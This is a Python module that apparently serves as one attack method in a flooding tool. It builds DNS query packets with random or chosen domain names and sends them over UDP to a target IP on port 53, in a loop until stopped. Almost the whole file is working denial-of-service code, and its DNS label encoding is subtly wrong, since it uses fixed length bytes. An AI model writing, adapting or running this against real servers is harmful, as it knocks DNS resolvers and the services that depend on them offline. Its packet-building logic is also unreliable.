from . import BaseMethod
from socket import *
from random import randbytes, choices, randint
import string


def dns_data(domain):
    dmn_block = b'\x06'
    if domain:
        dmn_block += b'\x03'.join([dom.encode() for dom in domain.split(".")])
    else:
        a = ''.join(choices(string.ascii_lowercase + string.digits, k=randint(2, 3))).encode()
        b = ''.join(choices(string.ascii_lowercase + string.digits, k=randint(3, 10))).encode()
        dmn_block += b'\x03'.join([b, a])
    dmn_block += b'\x00'

    id = randbytes(2)
    res = id + \
          b'\x01\x00' + \
          b'\x00\x01' + b'\x00\x00' + b'\x00\x00' + b'\x00\x00'
    res += dmn_block
    res += b'\x00\x01' + b'\x00\x01'
    return res


class Method(BaseMethod):
    def __init__(self, params: dict):
        super().__init__(params)
        if self.params["Port"] is None:
            self.params["Port"] = 53

    def worker(self) -> None:
        rpc = self.params["RPC"]

        while not self.is_terminate:
            s = socket(AF_INET, SOCK_DGRAM)
            s.settimeout(self.params["Timeout"])

            try:
                s.connect((self.params["Ip"], self.params["Port"]))
                self.put_to_receive_queue(s)

                for _ in range(0, rpc):
                    if self.is_terminate:
                        break
                    self.throttle()

                    data = dns_data(self.params["Host"])
                    if not self.send_to_socket(s, data):
                        break
                s.shutdown(SHUT_WR)
            except OSError as e:
                self.last_error = e
                self.total_failed_count += 1
